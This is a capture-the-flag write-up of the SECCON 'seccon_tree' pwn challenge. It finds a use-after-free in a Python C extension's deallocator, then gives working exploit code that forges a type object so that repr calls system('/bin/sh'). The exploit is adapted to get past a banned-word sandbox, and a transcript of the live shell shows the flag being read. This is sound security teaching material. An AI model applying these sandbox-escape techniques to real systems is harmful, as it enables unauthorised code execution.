# seccon_tree

**Author**: pql

**Tags**: pwn, python, module, sandbox 

**Points**: 393 (4 solves)

> Let's make your own tree! nc seccon-tree.quals.seccon.jp 30001

## The challenge
We're given an archive containing a Dockerfile, a python [C Extension Module](https://docs.python.org/3/extending/extending.html) along with its source, and a small python server that listens on a port and executes semi-arbitrary code after performing some checks.

```
seccon_tree
├── Dockerfile
├── env
│   ├── banned_word
│   ├── run.py
│   ├── seccon_tree.cpython-39-x86_64-linux-gnu.so
│   └── template.py
├── flag
└── src
    ├── lib.c
    └── setup.py
```

Additionally, we're given an example on how to use the provided extension module:

```python
# Here is an example.

from seccon_tree import Tree

cat = Tree("cat")
lion = Tree("lion")
tiger = Tree("tiger")

cat.add_child_left(lion)
cat.add_child_right(tiger)

assert(cat.find("lion") is not None)
assert(lion.find("tiger") is None)
```

Ok, so nothing special here. The extension module just implements a binary tree structure, and assumedly we have to exploit it (as the challenge is marked `pwn`). As mentioned, we can execute semi-arbitrary code on the server. It might be a good idea to look at what constraints are imposed on us (maybe we can cheese it!):

Looking at `run.py`, our code is inserted into a template (`/** code **/` is replaced with our input):

```python
from seccon_tree import Tree

# Debug utility
seccon_print = print
seccon_bytes = bytes
seccon_id = id
seccon_range = range
seccon_hex = hex
seccon_bytearray = bytearray
class seccon_util(object):
    def Print(self, *l):
        seccon_print(*l)
    def Bytes(self, o):
        return seccon_bytes(o)
    def Id(self, o):
        return seccon_id(o)
    def Range(self, *l):
        return seccon_range(*l)
    def Hex(self, o):
        return seccon_hex(o)
    def Bytearray(self, o):
        return seccon_bytearray(o)

dbg = seccon_util()

# Disallow everything
for key in dir(__builtins__):
    del __builtins__.__dict__[key]
del __builtins__


/** code **/

```

Furthermore, a list of banned strings is provided: if any of these strings occur in our supplied payload code, it is rejected.

```
attr,base,breakpoint,builtins,code,debug,dict,eval,exec,frame,global,import,input,loader,locals,memoryview,module,mro,open,os,package,raise,read,seccon,spec,sub,super,sys,system,type,vars,write
```

Ouch, that's quite an exhaustive list! In combination with all of `__builtins__` being removed, this doesn't leave much room for cheese. Ergo, exploiting the module itself it is. Before starting exploitation, we grab the `python3.9` executable as well as its debug files from the docker container and merge them together:

```bash
docker cp seccon_pwn:/usr/bin/python3.9 ./
docker cp seccon_pwn:/usr/lib/debug/.build-id/00/e6cc236dd0e3107072f45b03325ebc736013fa.debug
eu-unstrip ./python3.9 e6cc236dd0e3107072f45b03325ebc736013fa.debug
```

This is going to make debugging a lot easier. We can now get full type info in gdb, which allows for detailed stack traces and pretty-printing of structures.

# A primer on CPython

Everything in python is an object. There is no concept of 'primitive types' like in Java, C++, or PHP. Even types themselves are objects! In CPython, all of these objects are allocated on the heap, using the default system allocator (`ptmalloc2` on linux).

An object can be referenced generically with a `PyObject*` pointer. Every CPython object has a `PyObject` at the beginning, which contains a reference count and a `PyTypeObject*` pointer describing the type of the object. The `PyObject*` pointer has to be cast to a more complete subtype to access any additional fields in the structure. This is reminiscent of the object model in languages like C++, except implemented manually.

A `PyTypeObject` corresponds to a `type` in python and is an object in itself. This object contains things like:

- The type name.
- The size of objects of this type.
- "Special" function pointers for native implementations of `__repr__`, `__str__`, `__hash__`  etc.
- Docstring for objects of this type.
- Methods and members for objects of this type.
- (De)allocation, deletion and initialization function pointers.

The reference count inside of `PyObject` is a 64 bit unsigned integer used for memory management. Every time an object gains a reference (for example by assigning it to a different variable) the reference count is incremented, and every time it loses a reference (for example, when `del` is used or a variable goes out of scope) the reference count is decremented.

When the reference count reaches zero, the object is destroyed immediately. Optionally some specific destruction code can be ran before the object is freed and released to the allocator again. 

Note that this is a very primitive garbage collection algorithm compared to runtimes like Java and Go. Objects are simply freed on the main thread directly when the reference count reaches zero. For our purposes this is a good thing, as this makes it a lot less painful to exploit memory management bugs.

# Finding the bug


So, looking at the module extension source, it declares a new type `seccon_tree.Tree`, which is defined as follows:

```c
static PyTypeObject TreeType;

typedef struct {
    PyObject_HEAD
    PyObject *object;
    PyObject *left;
    PyObject *right;
} Tree;

static PyMethodDef TreeMethods[] = {
    {"find", (PyCFunction)find_node, METH_VARARGS, "tree: find"},
    {"get_object", (PyCFunction)get_object, METH_VARARGS, "tree: get_object"},
    {"get_child_left", (PyCFunction)get_child_left, METH_VARARGS, "tree: get_child_left"},
    {"get_child_right", (PyCFunction)get_child_right, METH_VARARGS, "tree: get_child_right"},
    {"add_child_left", (PyCFunction)add_child_left, METH_VARARGS, "tree: add_child_left"},
    {"add_child_right", (PyCFunction)add_child_right, METH_VARARGS, "tree: add_child_right"},
    {NULL}
};

static PyTypeObject TreeType = {
    PyVarObject_HEAD_INIT(NULL, 0)
    "seccon_tree.Tree",             /* tp_name */
    sizeof(Tree),                   /* tp_basicsize */
    0,                              /* tp_itemsize */
    (destructor)Tree_dealloc,       /* tp_dealloc */
    0,                              /* tp_print */
    0,                              /* tp_getattr */
    0,                              /* tp_setattr */
    0,                              /* tp_reserved */
    0,                              /* tp_repr */
    0,                              /* tp_as_number */
    0,                              /* tp_as_sequence */
    0,                              /* tp_as_mapping */
    0,                              /* tp_hash */
    0,                              /* tp_call */
    0,                              /* tp_str */
    0,                              /* tp_getattro */
    0,                              /* tp_setattro */
    0,                              /* tp_as_buffer */
    Py_TPFLAGS_DEFAULT,             /* tp_flags */
    "my tree",                      /* tp_doc */
    0,                              /* tp_traverse */
    0,                              /* tp_clear */
    0,                              /* tp_richcompare */
    0,                              /* tp_weaklistoffset */
    0,                              /* tp_iter */
    0,                              /* tp_iternext */
    TreeMethods,                    /* tp_methods */
    0,                              /* tp_members */
    0,                              /* tp_getset */
    0,                              /* tp_base */
    0,                              /* tp_dict */
    0,                              /* tp_descr_get */
    0,                              /* tp_descr_set */
    0,                              /* tp_dictoffset */
    0,                              /* tp_init */
    0,                              /* tp_alloc */
    Tree_new,                       /* tp_new */
};
```

So, the `Tree` object simply represents a node in a binary tree, with a left reference, a right reference and an inner object. Even though `left` and `right` are declared as `PyObject*` in the `Tree` struct, these fields can effectively only be set to another `Tree` object. A summary of the declared methods:

- `get_child_left`, `get_child_right` fetch the `left` and respectively `right`  fields of the `Tree` and return it after increasing their reference counts.
- `add_child_left`, `add_child_right` set the `left` and respectively `right` fields of the `Tree` to the supplied `Tree` after increasing its reference count.
- `get_object` returns the `object` field of the `Tree` after increasing its reference count.
- `find` traverses the `Tree` and tries to compare the `object` fields to the supplied object via `repr`. It returns the matching `Tree` (after increasing its reference count) on match or `None` if no match was found.
- `Tree_new` acts as allocator and initializer of the `Tree` in one, allocating memory for the object and setting its `object` field to the supplied argument.
    - Normally this functionality is split up between `__new__` and `__init__` but this object seems to implement it in a single method, I am not sure if this is conventional or not.
- `Tree_dealloc` is calle whenever the reference count of the `Tree` drops to zero and frees the `Tree` struct.

It's interesting to note that the fields of the `Tree` struct are not exposed as members, so expressions like `tree.object` will not work.

After some manual review, I found a bug in `Tree_dealloc`:

```c
static void
Tree_dealloc(Tree *self)
{
    Py_XDECREF(self->left);
    Py_XDECREF(self->right);
    Py_XDECREF(self->object);

    Py_TYPE(self)->tp_free((PyObject *) self);
}
```

Decrementing refcounts in deallocation functions in this manner is unsafe. If `self->object` has a reference count of one and implements a custom `__del__` method, this method is potentially still able to reference its associated `Tree` container, even though it will be unconditionally freed after. This can lead to a classic use-after-free condition, and optionally this can be converted to a double free.

To properly exploit this, we should take a look at the `add_child_left` (or right) method:

```c
static PyObject*
add_child_left(Tree *self, PyObject *args) {
    PyObject *obj;
    if (!PyArg_ParseTuple(args, "O!", &TreeType, &obj)) {
        return NULL;
    }
    if (self->left != NULL) {
        Py_DECREF(self->left);
    }
    Py_INCREF(obj);
    self->left = obj;

    Py_RETURN_NONE;
}
```

If the `left` field is replaced with another `Tree`, the old `Tree`'s reference count is decremented, triggering `Tree_dealloc` if this was the only reference. `Tree_dealloc` will in turn decrement the old `Tree`'s `object` field reference count, which can trigger a custom `__del__` method. This method can then call `get_child_left` on the root `Tree`, which will increment the reference counter again, but since we're still in `Tree_dealloc`, the `Tree` will be freed. If we save the result of `get_child_left` to a global state we get a handle to a freed object. If we do not, the reference counter will decrease again after the object goes out of scope and we're left with a double free after `Tree_dealloc` gets called again. 

So, a basic proof of concept for the user-after-free would be:

```python
from seccon_tree import Tree

root = Tree('x')

dangling_ref = None

class Pwn:
    
    def __del__(self):
        global dangling_ref
        dangling_ref = root.get_child_left()
        
def trigger():
    root.add_child_left(Tree(Pwn()))
    
    # Drop refcount of Pwn object, triggering destruction
    root.add_child_left(Tree(None))

trigger()

new_ref = Tree('a')

print(dangling_ref)
print(new_ref)
```

Executing this in the docker container yields:

```bash
user@c19c5a5d3718:/exp$ ./python3.9x poc.py 
<seccon_tree.Tree object at 0x7f588df83f60>
<seccon_tree.Tree object at 0x7f588df83f60>
```

This scenario is not very exciting in itself, since the only thing we've turned the UAF into is a `Tree` with two references but an actual reference count of one, but demonstrates the vulnerability.

Funnily enough, this apparently was not the intended bug! After the competition ended, the author revealed that the intended bug was actually in `find`: the comparison with `repr` would allow a malicious object to implement a `__repr__` method that would replace a node in the tree, causing an use-after-free as well. I assume that exploitation would be mostly the same after this point, as these are quite similar scenarios.

## Exploitation

I chose to first implement a standalone exploit that doesn't concern itself with the sandboxed environment as it saves us a great deal of pain, both implementation wise and debugging wise. Luckily the exploit worked in the sandbox without major changes.

After creating the proof of concept it took me about three hours to get a shell. I made the mistake of treating this too much like a "normal" use-after-free scenario where you create a type confusion by allocating two different objects at the same location. For CPython this turned out to be impossible (or too hard) with `PyObject` types, as the interpreter dynamically deduces the types based on the `PyTypeObject` pointer, and as such there is no actually difference in behavior when operating on the value in two different contexts. For example:

```python
from seccon_tree import Tree

root = Tree('x')

dangling_ref = None

class X:
    def __del__(self):
        global dangling_ref
        print("[+] Triggering UAF")
        dangling_ref = root.get_child_left()

def trigger():
    root.add_child_left(Tree(X()))
    root.add_child_left(Tree(None))

trigger()

# this seems to magically be allocated at the same spot as `dangling_ref`
confusion = bytes(10) 
print(dangling_ref)
print(confusion)
input()
```

will yield:

```bash
user@c19c5a5d3718:/exp$ ./python3.9x poc.py 
[+] Triggering UAF
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

After realizing this wasn't going to work, I opted for trying to get a `bytearray` allocation at the same location as the freed `Tree` (which probably should have been my first idea anyway). With allocation I don't mean the actual object, but rather where its contents are stored.

Looking in [Include/cpython/bytearrayobject.h](https://github.com/python/cpython/blob/main/Include/cpython/bytearrayobject.h), this pointer is stored in the `ob_bytes` field of `PyByteArrayObject`:

```c
typedef struct {
    PyObject_VAR_HEAD
    Py_ssize_t ob_alloc;   /* How many bytes allocated in ob_bytes */
    char *ob_bytes;        /* Physical backing buffer */
    char *ob_start;        /* Logical start inside ob_bytes */
    Py_ssize_t ob_exports; /* How many buffer exports */
} PyByteArrayObject;
```

We're lucky that `bytearray().__sizeof__() == 56` and `Tree(X()).__sizeof__() == 40`, so we can be fairly sure that the allocation of a `bytearray` itself will not inadvertedly get allocated at our target chunk.

N.B: if you're not very familiar with python, the `bytearray` object is a mutable version of the `bytes` object. This is useful, as the data is stored in a seperate buffer instead of just appended to the object iself. Additionally, we can change the contents of the buffer after the object has been allocated which might make our life easier.

The following code will successfully allocate a buffer of null bytes at the location of `dangling_ref`:

```python
from seccon_tree import Tree

root = Tree('x')

dangling_ref = None

class X:
    def __del__(self):
        global dangling_ref
        print("[+] Triggering UAF")
        dangling_ref = root.get_child_left()

def trigger():
    root.add_child_left(Tree(X()))
    root.add_child_left(Tree(None))

trigger()

print(dangling_ref)
a = bytearray(40)
print(dangling_ref)
input()
```

```bash
user@c19c5a5d3718:/exp$ ./python3.9x poc.py 
[+] Triggering UAF
<seccon_tree.Tree object at 0x7f022ab05f00>
Segmentation fault (core dumped)
```

And we get our segfault! Examining the crash in gdb:

```
gef➤  r poc.py 
Starting program: /exp/python3.9x poc.py
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] Triggering UAF
<seccon_tree.Tree object at 0x7f2166dccf00>

Program received signal SIGSEGV, Segmentation fault.
PyObject_Str (v=0x7f2166dccf00) at ../Objects/object.c:463
463	../Objects/object.c: No such file or directory.

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007f2166f9e740  →  0x00007f2166f9e740  →  [loop detected]
$rbx   : 0x00000000014bd900  →  0x0000000000000000
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007ffc7f2e32f0  →  0x0000000000000001
$rbp   : 0x00000000014bf300  →  0x0000000000000000
$rsi   : 0x246             
$rdi   : 0x00007f2166dccf00  →  0x0000000000000001
$rip   : 0x00000000005f81a1  →  <PyObject_Str+113> cmp QWORD PTR [rcx+0x88], 0x0
$r8    : 0x0               
$r9    : 0x00000000014bdb80  →  0x00007f2166e588b0  →  0x00007f2166e5a1f0  →  0x00007f2166e56620  →  0x00007f2166e56670  →  0x00007f2166e566c0  →  0x00007f2166e5a2d0  →  0x00007f2166e56710
$r10   : 0x8               
$r11   : 0x00007ffc7f2e32d8  →  0x0000000000000000
$r12   : 0x00007f2166dccf00  →  0x0000000000000001
$r13   : 0x1               
$r14   : 0x00000000015199f8  →  0x00007f2166ef74a0  →  0x0000000000000004
$r15   : 0x00007f2166ef74a0  →  0x0000000000000004
$eflags: [zero CARRY PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffc7f2e32f0│+0x0000: 0x0000000000000001	 ← $rsp
0x00007ffc7f2e32f8│+0x0008: 0x00007f2166f9e740  →  0x00007f2166f9e740  →  [loop detected]
0x00007ffc7f2e3300│+0x0010: 0x0000000000000000
0x00007ffc7f2e3308│+0x0018: 0x00007f2166e4fea0  →  0x0000000000000001
0x00007ffc7f2e3310│+0x0020: 0x00007f2166dccf00  →  0x0000000000000001
0x00007ffc7f2e3318│+0x0028: 0x000000000065862f  →  <PyFile_WriteObject+63> mov r12, rax
0x00007ffc7f2e3320│+0x0030: 0x0000000000000001
0x00007ffc7f2e3328│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x5f818f <PyObject_Str+95> mov    rcx, QWORD PTR [r12+0x8]
     0x5f8194 <PyObject_Str+100> cmp    rcx, 0x9590a0
     0x5f819b <PyObject_Str+107> je     0x5f823a <PyObject_Str+266>
 →   0x5f81a1 <PyObject_Str+113> cmp    QWORD PTR [rcx+0x88], 0x0
     0x5f81a9 <PyObject_Str+121> je     0x4edaf3 <PyObject_Str-1091133>
     0x5f81af <PyObject_Str+127> mov    rbp, QWORD PTR [rip+0x3adca2]        # 0x9a5e58 <_PyRuntime+568>
     0x5f81b6 <PyObject_Str+134> mov    edi, DWORD PTR [rbp+0x20]
     0x5f81b9 <PyObject_Str+137> mov    rsi, QWORD PTR [rbp+0x10]
     0x5f81bd <PyObject_Str+141> add    edi, 0x1
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "python3.9x", stopped 0x5f81a1 in PyObject_Str (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5f81a1 → PyObject_Str(v=0x7f2166dccf00)
[#1] 0x65862f → PyFile_WriteObject(v=0x7f2166dccf00, f=<optimized out>, flags=<optimized out>)
[#2] 0x640777 → builtin_print(self=<optimized out>, args=0x1519a00, nargs=0x1, kwnames=<optimized out>)
[#3] 0x525c44 → cfunction_vectorcall_FASTCALL_KEYWORDS(func=0x7f2166ef74a0, args=0x1519a00, nargsf=<optimized out>, kwnames=<optimized out>)
[#4] 0x599267 → _PyObject_VectorcallTstate(kwnames=0x0, nargsf=<optimized out>, args=0x1519a00, callable=0x7f2166ef74a0, tstate=0x14bf300)
[#5] 0x599267 → PyObject_Vectorcall(kwnames=0x0, nargsf=<optimized out>, args=0x1519a00, callable=0x7f2166ef74a0)
[#6] 0x599267 → call_function(kwnames=0x0, oparg=<optimized out>, pp_stack=<synthetic pointer>, tstate=0x14bf300)
[#7] 0x599267 → _PyEval_EvalFrameDefault(tstate=<optimized out>, f=<optimized out>, throwflag=<optimized out>)
[#8] 0x59734e → _PyEval_EvalFrame(throwflag=0x0, f=0x1519890, tstate=0x14bf300)
[#9] 0x59734e → _PyEval_EvalCode(tstate=<optimized out>, _co=<optimized out>, globals=<optimized out>, locals=<optimized out>, args=<optimized out>, argcount=<optimized out>, kwnames=0x0, kwargs=0x0, kwcount=<optimized out>, kwstep=0x2, defs=0x0, defcount=<optimized out>, kwdefs=0x0, closure=0x0, name=0x0, qualname=0x0)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

gef➤  telescope 0x7f2166dccf00
0x00007f2166dccf00│+0x0000: 0x0000000000000001	 ← $rdi, $r12
0x00007f2166dccf08│+0x0008: 0x0000000000000000
0x00007f2166dccf10│+0x0010: 0x0000000000000000
0x00007f2166dccf18│+0x0018: 0x0000000000000000
0x00007f2166dccf20│+0x0020: 0x0000000000000000
0x00007f2166dccf28│+0x0028: 0x0000000000000000
0x00007f2166dccf30│+0x0030: 0x0000000000000001
0x00007f2166dccf38│+0x0038: 0x0000000000958d20  →  0x0000000000000046 ("F"?)
0x00007f2166dccf40│+0x0040: 0x0000000000000002
0x00007f2166dccf48│+0x0048: 0xffffffffffffffff
gef➤  
```

We've basically got the perfect primitive! Our 40 byte `bytearray` allocation is allocated exactly at the old address of the `Tree`, which we still have a reference to through our `dangling_ref`. Note that the first byte is `1` because of the fact that `print` increments the reference count of the object.

Further exploitation is quite easy. We can overwrite the `PyObjectType` pointer of the `PyObject` to point to a buffer of arbitrary data. As a `PyObjectType` contains a bunch of function pointers, we should be able to easily get `rip` control. Even more fortunately, the (non-PIE) python executable links to `system`! Putting one and one together this shouldn't be too bad. We forge the `tp_repr` pointer to point to `system`, and set the reference count of the associated object to `"/bin/sh;"`.

The following code gets us a shell:

```python
from seccon_tree import Tree

root = Tree('x')

dangling_ref = None

def p64(x):
    return x.to_bytes(8, 'little')

class X:
    def __del__(self):
        global dangling_ref
        print("[+] Triggering UAF")
        dangling_ref = root.get_child_left()

def trigger():
    root.add_child_left(Tree(X()))
    root.add_child_left(Tree(None))

trigger()

print(dangling_ref)
a = bytearray(40)

# This is a bit messy but putting the constants in variables 
# seems to do heap things.. which is not desirable.

# 0x956900: pointer to the type of PyObjectType itself
# 0x4214f0: pointer to the system routine
    
r = p64(0xc) + p64(0x956900) + 2 * p64(0) + p64(0x28) + 6 * p64(0) + p64(0x4214F0) + 12 * p64(0) 

print(hex(id(r))) # print address of `r`


# Overwrite refcount of dangling_ref to be ".bin/sh;"
# repr will actually increase the reference count by one, so '.' + 1 = '/'
a[0:8] = b".bin/sh;"


# Set the PyObjectType pointer of dangling_ref to the values of `r` we declared above.
# The values start 0x20 bytes into the PyBytes object.
a[8:16] = p64(id(r) + 0x20)

repr(dangling_ref) # trigger system("/bin/sh;")
```

```
user@c19c5a5d3718:/exp$ ./python3.9x poc.py 
[+] Triggering UAF
<seccon_tree.Tree object at 0x7f33add45ea0>
0x7f33ade125d0
$ id
uid=1000(user) gid=999(user) groups=999(user)
$ 
```

Cool! Now comes the scary part, seeing whether this strategy is portable to the sandboxed environment.

Luckily, there were only two problems I had to deal with:

- The `class` keyword does not exist, so we can't declare types conventionally
- `global` is not a permitted keyword

We can overcome 1) with an overload of the `type` initializer. `type(name, bases, dict)` returns a new type, and we can specify members in `dict`.

We can overcome 2) by just using a global mutable data structure instead, like a `list`.

The final exploit:

```python
root = Tree('x')
dangling_ref = []

bytearray = dbg.Bytearray
print = dbg.Print
id = dbg.Id
hex = dbg.Hex
bytes = dbg.Bytes

def p64(x):
    return x.to_bytes(8, 'little')


def delfunc(x):
    dbg.Print("[+] Triggering UAF")
    dangling_ref.append(root.get_child_left())

# create our type in an unconventional manner
# "a".__class__.__class__ corresponds to `type`
X = "a".__class__.__class__("X", (), {"__del__":delfunc}) 


# for some reason we now need to store this.. I'm not sure why
z = []
def trigger():
    root.add_child_left(Tree(X()))
    z.append(Tree(None))
    root.add_child_left(z[0])

trigger()

print(dangling_ref[0])
a = bytearray(40)

# This is a bit messy but putting the constants in variables 
# seems to do heap things.. which is not desirable.

# 0x956900: pointer to the type of PyObjectType itself
# 0x4214f0: pointer to the system routine
r = p64(0xc) + p64(0x956900) + p64(0) + p64(0) + p64(0x28) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0x4214F0) + 12 * p64(0)

# Print address of `r`
print(hex(id(r)))

a[0:8] = b"/bin/sh;"
a[8:16] = p64(id(r) + 0x20)

# if we just call print on the whole list it seems like we don't have the refcount problem
# print will call repr on the list, which will in turn call repr on every element  
print(dangling_ref)
```

Note that you have to remove the comments in order to pass the check.

```
➜  ~ nc seccon-tree.quals.seccon.jp 30001
[Proof of Work]
Submit the token generated by `hashcash -mb25 dekeqerfx`
1:25:211214:dekeqerfx::WJ5uhR6NTxZ++3jN:00000000Xkev
matched token: 1:25:211214:dekeqerfx::WJ5uhR6NTxZ++3jN:00000000Xkev
check: ok
Give me the source code url (where filesize < 10000).
Someone says that https://transfer.sh/ is useful if you don't have your own server
http://REDACTED:8000/exp.py
[+] Triggering UAF
<seccon_tree.Tree object at 0x7fad95b94180>
0x7fad95b8c300
ls
banned_word
flag-2ed5991c0023b19e969ed2a7882a2d59
run.py
seccon_tree.cpython-39-x86_64-linux-gnu.so
template.py
cat flag*
SECCON{h34p_m4n463m3n7_15_h4rd_f0r_hum4n5....}
```

Sure is, seeing how this bug was apparently unintended :p.

## Conclusion

I thought this was quite a nice challenge. I didn't have any experience with CPython internally before this, so I learned a lot about the interpreter. 

We first-blooded this challenge about 6 hours into the CTF. I was surprised to see that the second solve was finally made about 16 hours into the CTF, as I didn't think this was that hard of a challenge. Maybe the `find` bug was actually a lot harder to exploit?

If the python binary would have had PIE, exploitation would be a bit harder, as you'd also have to leak libc or the executable base. I suppose you could leak values via the name or docstring field of the `PyTypeObject`though.

Thanks to [moratorium08](https://twitter.com/moratorium08) for the great challenge!
